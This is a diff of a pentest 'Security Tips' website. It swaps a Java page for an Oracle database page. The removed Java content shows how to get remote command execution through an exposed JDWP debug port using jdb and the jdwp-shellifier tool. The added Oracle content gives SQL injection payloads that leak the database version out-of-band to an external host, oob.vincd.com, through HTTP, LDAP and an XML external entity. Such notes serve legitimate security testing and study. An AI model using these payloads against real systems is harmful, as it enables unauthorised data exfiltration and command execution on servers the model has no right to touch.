@@ -7,22 +7,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  
-  
+  <meta name="description" content="Tips to exfiltrate information from a Oracle database.">
+  <meta name="keywords" content="sql, SQL injection, oob, DNS, oracle">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
   <title>
-    Java - Security Tips
+    Oracle - Security Tips
     
   </title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Java";
-    var mkdocs_page_input_path = "java.md";
-    var mkdocs_page_url = "/java/";
+    var mkdocs_page_name = "Oracle";
+    var mkdocs_page_input_path = "oracle.md";
+    var mkdocs_page_url = "/oracle/";
   </script>
    
 </head>
@@ -146,7 +146,7 @@
           
           <li class="bold">
             
-    <span class="section-link ">SQL</span>
+    <span class="section-link active">SQL</span>
     <ul>
                 <li class="">
                     
@@ -156,9 +156,14 @@
                     
     <a class="section-link" href="../mariadb/">MariaDB</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../oracle/">Oracle</a>
+    <a class="section-link" href="./">Oracle</a>
+    <ul>
+            
+    
+
+    </ul>
                 </li>
     </ul>
           </li>
@@ -235,28 +240,15 @@
           
           <li class="bold">
             
-    <span class="section-link active">Languages</span>
+    <span class="section-link ">Languages</span>
     <ul>
                 <li class="">
                     
     <a class="section-link" href="../php/">PHP</a>
                 </li>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">Java</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#decompile-java-code">Decompile Java code</a></li>
-    
-        <li><a class="" href="#java-debug-wire-protocol-jdwp">Java Debug Wire Protocol (JDWP)</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../java/">Java</a>
                 </li>
                 <li class="">
                     
@@ -338,41 +330,11 @@
         <div role="main">
           <div class="section">
             
-              <h1></h1>
-              <h1 id="java">Java</h1>
-<h2 id="decompile-java-code">Decompile Java code</h2>
-<p>I use two tools to decompile Java classes (<code>.class</code>, <code>.jar</code>, <code>.war</code>, ...):</p>
-<ul>
-<li><a href="http://java-decompiler.github.io/" target="_blank"><code>jd-gui</code></a>: it's quick and easy to use with
-its graphical interface. I use it with a small codebase</li>
-<li><a href="https://www.benf.org/other/cfr/" target="_blank"><code>cfr</code></a>: CFR is a command line tool and it's
-focused on modern Java features. I use it when JD-Gui got troubles with large or
-new Java codebase.</li>
-</ul>
-<pre><code class="language-bash">java -jar cfr-0.150.jar /path/to/jar --outputdir /path/output/dir
-</code></pre>
-<h2 id="java-debug-wire-protocol-jdwp">Java Debug Wire Protocol (JDWP)</h2>
-<p><code>JWDP</code> is the protocol used for communication between a debugger and a Java app (JVM).</p>
-<h3 id="manual-exploitation">Manual exploitation</h3>
-<p>It's possible to execute shell commands using <code>jdb</code>:</p>
-<pre><code class="language-bash">jdb -attach 8000
-</code></pre>
-<p>Then you need to find a good java thread to stop in and execute you command. It
-appears that the method <code>indexOf</code> of the <code>String</code> class is a good candidate:</p>
-<pre><code class="language-bash">trace go methods
-# wait that the jdb dies
-stop in java.lang.String().indexOf(int)
-print new java.lang.Runtime().exec(&quot;&lt;cmd&gt;&quot;)
-</code></pre>
-<p>This should execute you command with the privilege of the Java application. But
-be careful, the manual method often fails.</p>
-<h3 id="jdwp-shellifier">jdwp-shellifier</h3>
-<p><code>jdwp-shellifier</code> is an exploitation tool to exploit <code>JWDP</code>. It's available on
-<a href="https://github.com/IOActive/jdwp-shellifier" target="_blank">github</a>.</p>
-<p>Again we use the <code>indexOf</code> method to break on, it's possible to use an other one.</p>
-<pre><code class="language-bash">git clone https://github.com/IOActive/jdwp-shellifier
-cd jdwp-shellifier
-python jdwp-shellifier.py -t &lt;ip&gt; - p &lt;port&gt; --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&lt;cmd&gt;&quot;
+              <h1>Oracle database</h1>
+              <h2 id="make-dns-queries">Make DNS queries</h2>
+<pre><code class="language-sql">SELECT url_http.request((SELECT version FROM v$instance) || 'oob.vincd.com') FROM dual;
+SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance) || 'oob.vincd.com', 80) FROM dual;
+SELECT Extractvalue(XmlType('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://xxx.oob.vincd.com&quot;&gt; %remote; %param1;]&gt;'), '/L') from dual;
 </code></pre>
             
           </div>
@@ -392,10 +354,10 @@ python jdwp-shellifier.py -t &lt;ip&gt; - p &lt;port&gt; --break-on &quot;java.l
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../php/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../mariadb/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../python/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../cve/CVE-2016-3714/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
